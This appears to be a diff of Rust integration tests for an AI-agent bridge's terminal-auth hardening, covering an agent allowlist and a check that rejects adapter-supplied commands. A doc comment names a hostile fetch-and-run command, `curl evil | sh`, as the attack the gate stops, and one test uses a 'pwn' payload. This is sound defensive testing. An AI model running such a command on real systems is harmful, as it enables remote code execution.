@@ -401,9 +401,17 @@ async fn x5d_authenticate_unknown_method_id_returns_method_not_advertised() {
 // -----------------------------------------------------------------
 #[tokio::test]
 async fn x5d_authenticate_terminal_method_returns_capability_disabled() {
-    let (url, _state) = start_bridge_acp(json!([
-        { "id": "login-terminal", "type": "terminal", "name": "Terminal login" }
-    ]))
+    // Stage X.5d (post-4861619 hardening): the allowlist gate fires
+    // *first*, so this test uses `gemini-acp` (the only allowlisted
+    // agent) to reach the original capability check. With
+    // `_meta.terminal-auth` missing, the bridge must still surface
+    // `auth.terminal_capability_disabled`.
+    let (url, _state) = start_bridge_with_id(
+        "gemini-acp",
+        json!([
+            { "id": "login-terminal", "type": "terminal", "name": "Terminal login" }
+        ]),
+    )
     .await;
     let mut ws = connect_hello(&url).await;
     let sid = create_session(&mut ws, "executor.code@1.0.0").await;
@@ -440,37 +448,27 @@ async fn x5d_authenticate_terminal_method_returns_capability_disabled() {
 // -----------------------------------------------------------------
 #[tokio::test]
 async fn x5d_authenticate_terminal_method_with_terminal_auth_metadata_returns_ok() {
-    let launcher_root = tempfile::tempdir().unwrap();
-    let ts_out = launcher_root.path().join("ts");
-    let rs_out = launcher_root.path().join("rs");
-    std::fs::create_dir_all(&ts_out).unwrap();
-    std::fs::create_dir_all(&rs_out).unwrap();
-    let launcher_command = target_root().join("target/debug/vac-codegen");
-    let launcher_args = vec![
-        "--schemas".to_string(),
-        target_root()
-            .join("packages/protocol/v1")
-            .display()
-            .to_string(),
-        "--ts-out".to_string(),
-        ts_out.display().to_string(),
-        "--rs-out".to_string(),
-        rs_out.display().to_string(),
-    ];
-    let (url, _state) = start_bridge_acp(json!([
+    // Stage X.5d (post-4861619 hardening): the happy-path now requires
+    // (a) an allowlisted agent (`gemini-acp`) and (b) the advertised
+    // terminal-auth command basename to match the configured agent
+    // command. We satisfy both by pointing the advertised command at
+    // the same `mock-acp` binary the bridge spawns for ACP. With
+    // stdin /dev/null and no `--acp` flag, mock-acp exits 0 quickly
+    // so the auth path completes with `session.auth_updated`.
+    let auth_methods = json!([
         {
-            "id": "claude-login",
+            "id": "spawn-gemini-cli",
             "type": "terminal",
-            "name": "Log in with Claude Code",
+            "name": "Login with Gemini CLI",
             "_meta": {
                 "terminal-auth": {
-                    "command": launcher_command.display().to_string(),
-                    "args": launcher_args
+                    "command": mock_acp_bin().display().to_string(),
+                    "args": []
                 }
             }
         }
-    ]))
-    .await;
+    ]);
+    let (url, _state) = start_bridge_with_id("gemini-acp", auth_methods).await;
     let mut ws = connect_hello(&url).await;
     let project_root = tempfile::tempdir().unwrap();
     let project_root_str = project_root.path().display().to_string();
@@ -480,17 +478,24 @@ async fn x5d_authenticate_terminal_method_with_terminal_auth_metadata_returns_ok
         &mut ws,
         "a4b",
         &sid,
-        json!({ "auth_method_id": "claude-login" }),
+        json!({ "auth_method_id": "spawn-gemini-cli" }),
     )
     .await;
     let (ack, events) = collect_auth_outcome(&mut ws, "a4b", true).await;
 
-    assert_eq!(ack["ok"], json!(true));
+    assert_eq!(
+        ack["ok"],
+        json!(true),
+        "ack must succeed; events={events:?}"
+    );
     let updated = events
         .iter()
         .find(|e| e.get("type") == Some(&json!("session.auth_updated")))
         .expect("session.auth_updated missing");
-    assert_eq!(updated["payload"]["auth_method_id"], json!("claude-login"));
+    assert_eq!(
+        updated["payload"]["auth_method_id"],
+        json!("spawn-gemini-cli")
+    );
     assert_eq!(updated["payload"]["auth_method_type"], json!("terminal"));
     assert_eq!(updated["payload"]["status"]["ok"], json!(true));
 }
@@ -622,5 +627,219 @@ async fn x5d_authenticate_stale_session_id_returns_session_not_found_without_eve
     assert!(
         auth_events.is_empty(),
         "stale session must not emit any session.auth_* event (got {auth_events:?})"
+    );
+}
+
+// ----------------------------------------------------------------------------
+// Stage X.5d — Gemini terminal-auth allowlist hardening (commit-after-4861619)
+// ----------------------------------------------------------------------------
+
+/// Build an ACP registry whose agent has a custom `id` (so we can
+/// drive both the allowlisted (`gemini-acp`) and non-allowlisted
+/// branches of the terminal-auth gate).
+fn build_acp_registry_with_id_and_auth_methods(
+    agent_id: &str,
+    auth_methods: Value,
+) -> AgentRuntimeRegistry {
+    let raw = serde_json::to_string(&auth_methods).expect("serialize authMethods");
+    let agent = AgentDefinition {
+        id: agent_id.to_string(),
+        label: format!("Mock ACP ({agent_id})"),
+        kind: AgentKind::Acp,
+        command: mock_acp_bin(),
+        args: vec!["--acp".into(), "--auth-methods".into(), raw],
+        enabled: true,
+        permission_timeout_ms: DEFAULT_PERMISSION_TIMEOUT_MS,
+    };
+    let cfg = AgentsConfig {
+        default_agent_id: agent.id.clone(),
+        agents: vec![agent],
+    };
+    AgentRuntimeRegistry::from_config(cfg, ConfigSource::Embedded)
+}
+
+async fn start_bridge_with_id(agent_id: &str, auth_methods: Value) -> (String, Arc<AppState>) {
+    let registry = build_acp_registry_with_id_and_auth_methods(agent_id, auth_methods);
+    let tmp = tempfile::tempdir().unwrap();
+    let audit = Arc::new(AuditFacility::new(tmp.path().to_path_buf()));
+    let sessions = SessionRegistry::with_runtime(Arc::new(registry));
+    sessions.attach_audit(Arc::clone(&audit));
+    let state = Arc::new(AppState {
+        started_at: Instant::now(),
+        sessions,
+        auth: AuthState::new_dev(),
+        audit,
+        pairing: PairingStore::new(),
+        profile_root: PathBuf::from(concat!(
+            env!("CARGO_MANIFEST_DIR"),
+            "/../../packages/protocol/v1/profiles"
+        )),
+        handoff: Arc::new(HandoffService::new()),
+    });
+    std::mem::forget(tmp);
+    let app = build_app(Arc::clone(&state));
+    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let addr = listener.local_addr().unwrap();
+    tokio::spawn(async move {
+        axum::serve(listener, app).await.unwrap();
+    });
+    (format!("ws://{}/api/sessions/stream", addr), state)
+}
+
+/// Non-allowlisted agent advertising a terminal-auth method must be
+/// refused with `auth.terminal_auth_not_allowed`. Even if the adapter
+/// supplies a perfectly innocent command, the bridge will not run it
+/// for an agent that isn't on the allowlist (currently `gemini-acp`).
+#[tokio::test]
+async fn terminal_auth_rejects_non_allowlisted_agent() {
+    let auth_methods = json!([{
+        "id": "x-terminal",
+        "type": "terminal",
+        "name": "Bogus Login",
+        "_meta": { "terminal-auth": { "command": "/bin/true", "args": [] } }
+    }]);
+    // agent id is intentionally NOT "gemini-acp".
+    let (url, _state) = start_bridge_with_id("claude-mock", auth_methods).await;
+    let mut ws = connect_hello(&url).await;
+    let session_id = create_session(&mut ws, "executor.code@1.0.0").await;
+
+    let cmd = json!({
+        "v": 1,
+        "id": "a1",
+        "type": "session.authenticate",
+        "session_id": session_id,
+        "payload": { "auth_method_id": "x-terminal" }
+    });
+    ws.send(Message::Text(cmd.to_string().into()))
+        .await
+        .unwrap();
+
+    let (ack, events) = collect_auth_outcome(&mut ws, "a1", true).await;
+    assert_eq!(ack["ok"], json!(false), "ack must fail-closed");
+    assert_eq!(
+        ack["error"]["code"],
+        json!("auth.terminal_auth_not_allowed")
+    );
+    let failed = events
+        .iter()
+        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
+        .expect("session.auth_failed event");
+    assert_eq!(
+        failed["payload"]["code"],
+        json!("auth.terminal_auth_not_allowed")
+    );
+    assert_eq!(failed["payload"]["auth_method_type"], json!("terminal"));
+}
+
+/// Even when the agent IS allowlisted (`gemini-acp`), if the adapter
+/// advertises a terminal-auth method whose command basename does NOT
+/// match the configured agent command, the bridge refuses with
+/// `auth.command_invalid`. This is the gate that stops a malicious
+/// adapter from advertising e.g. `/bin/sh -c "curl evil | sh"`.
+#[tokio::test]
+async fn terminal_auth_rejects_adapter_arbitrary_command() {
+    // mock-acp basename is `mock-acp`, NOT `echo` — so this advertised
+    // entry must be rejected even though the agent is allowlisted.
+    let auth_methods = json!([{
+        "id": "hostile",
+        "type": "terminal",
+        "_meta": { "terminal-auth": { "command": "/bin/echo", "args": ["pwn"] } }
+    }]);
+    let (url, _state) = start_bridge_with_id("gemini-acp", auth_methods).await;
+    let mut ws = connect_hello(&url).await;
+    let session_id = create_session(&mut ws, "executor.code@1.0.0").await;
+
+    let cmd = json!({
+        "v": 1,
+        "id": "a2",
+        "type": "session.authenticate",
+        "session_id": session_id,
+        "payload": { "auth_method_id": "hostile" }
+    });
+    ws.send(Message::Text(cmd.to_string().into()))
+        .await
+        .unwrap();
+
+    let (ack, events) = collect_auth_outcome(&mut ws, "a2", true).await;
+    assert_eq!(ack["ok"], json!(false));
+    assert_eq!(ack["error"]["code"], json!("auth.command_invalid"));
+    let failed = events
+        .iter()
+        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
+        .expect("session.auth_failed event");
+    assert_eq!(failed["payload"]["code"], json!("auth.command_invalid"));
+    assert_eq!(failed["payload"]["auth_method_type"], json!("terminal"));
+}
+
+/// `session.ready` for a `gemini-acp` agent must include the
+/// bridge-synthesized `spawn-gemini-cli` terminal auth method, even
+/// though the underlying ACP adapter (Gemini CLI / mock-acp) didn't
+/// advertise any auth method itself.
+#[tokio::test]
+async fn gemini_session_advertises_synthesized_spawn_gemini_cli() {
+    // Empty advertised authMethods — simulates the real Gemini CLI,
+    // which doesn't advertise OAuth-style ACP auth methods.
+    let (url, _state) = start_bridge_with_id("gemini-acp", json!([])).await;
+    let mut ws = connect_hello(&url).await;
+
+    // Capture the session.ready frame so we can introspect auth_methods.
+    let cmd = json!({
+        "v": 1,
+        "id": "c1",
+        "type": "session.create",
+        "session_id": "",
+        "payload": { "profile_id": "executor.code@1.0.0", "project_root": "/tmp/x" }
+    });
+    ws.send(Message::Text(cmd.to_string().into()))
+        .await
+        .unwrap();
+
+    let mut ready: Option<Value> = None;
+    let deadline = std::time::Instant::now() + Duration::from_secs(15);
+    while ready.is_none() {
+        let remaining = deadline.saturating_duration_since(std::time::Instant::now());
+        if remaining.is_zero() {
+            panic!("timed out waiting for session.ready");
+        }
+        let Some(msg) = tokio::time::timeout(remaining, ws.next()).await.unwrap() else {
+            panic!("ws closed before session.ready");
+        };
+        let Message::Text(txt) = msg.unwrap() else {
+            continue;
+        };
+        let v: Value = serde_json::from_str(&txt).unwrap();
+        if v.get("type") == Some(&json!("session.ready")) {
+            ready = Some(v);
+        }
+    }
+    let ready = ready.unwrap();
+    let methods = ready["payload"]["auth_methods"]
+        .as_array()
+        .cloned()
+        .unwrap_or_default();
+    let synth = methods
+        .iter()
+        .find(|m| m.get("id") == Some(&json!("spawn-gemini-cli")))
+        .expect("bridge must synthesize spawn-gemini-cli for gemini-acp");
+    assert_eq!(synth["type"], json!("terminal"));
+    let cmd_field = synth["_meta"]["terminal-auth"]["command"]
+        .as_str()
+        .expect("command string");
+    // The synthesized command points at the configured agent command
+    // (mock-acp in this test), proving the bridge owns the command
+    // and didn't take it from anywhere the adapter could influence.
+    assert!(
+        cmd_field.ends_with("mock-acp") || cmd_field.ends_with("mock-acp.exe"),
+        "synthesized command must be the configured agent command, got {cmd_field}"
+    );
+    let synth_args = synth["_meta"]["terminal-auth"]["args"]
+        .as_array()
+        .cloned()
+        .unwrap_or_default();
+    assert!(
+        synth_args
+            .iter()
+            .all(|a| a.as_str() != Some("--acp") && a.as_str() != Some("--experimental-acp")),
+        "synthesized args must have ACP runtime flags stripped, got {synth_args:?}"
     );
 }
